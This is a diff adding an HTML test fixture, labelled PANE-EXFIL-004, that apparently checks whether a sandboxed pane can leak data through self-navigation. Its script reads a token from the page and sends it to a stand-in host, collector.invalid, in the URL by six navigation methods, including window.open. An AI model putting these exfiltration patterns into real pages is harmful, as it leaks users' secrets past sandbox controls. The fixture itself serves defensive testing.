@@ -1,0 +1,20 @@
+<!--
+  PANE-EXFIL-004. Self-navigation carries the URL, and the URL carries the data.
+
+  `window.open` is in the same rule but NOT at the same severity: the reference
+  sandbox is `allow-scripts allow-same-origin allow-forms`, which grants
+  neither `allow-popups` nor `allow-top-navigation`. `window.open` is blocked
+  there. Self-navigation is not gated by any sandbox flag.
+-->
+<script>
+  const secret = document.getElementById('token').textContent;
+  const sink = 'https://collector.invalid/n?d=';
+
+  function go()      { location.href = sink + encodeURIComponent(secret); }
+  function goAssign(){ location.assign(sink + secret); }
+  function goRepl()  { location.replace(sink + secret); }
+  function goBare()  { location = sink + secret; }
+  function goWin()   { window.location = sink + secret; }
+  function popup()   { window.open(sink + secret, '_blank'); }
+</script>
+<span id="token">t</span>
